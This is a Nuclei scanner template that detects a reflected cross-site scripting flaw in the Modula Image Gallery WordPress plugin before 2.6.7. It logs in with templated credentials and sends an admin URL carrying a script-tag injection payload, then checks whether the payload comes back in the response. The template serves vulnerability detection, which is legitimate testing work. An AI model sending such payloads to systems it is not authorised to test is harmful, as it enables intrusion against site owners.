id: modula-image-gallery-xss
info:
  author: Akincibor
  description: The plugin does not escape some URLs before outputting them back in
    attributes, leading to Reflected Cross-Site Scripting.
  metadata:
    verified: true
  name: Modula Image Gallery < 2.6.7 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/ee248078-89ee-4cc0-b0fe-e932cd00db3e
  - https://wordpress.org/plugins/modula-best-grid-gallery
  severity: medium
  tags: wp-plugin,xss,wp,wordpress,authenticated
requests:
- cookie-reuse: true
  matchers:
  - part: body
    type: word
    words:
    - '&a\"><script>alert(1)</script>&extensions='
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
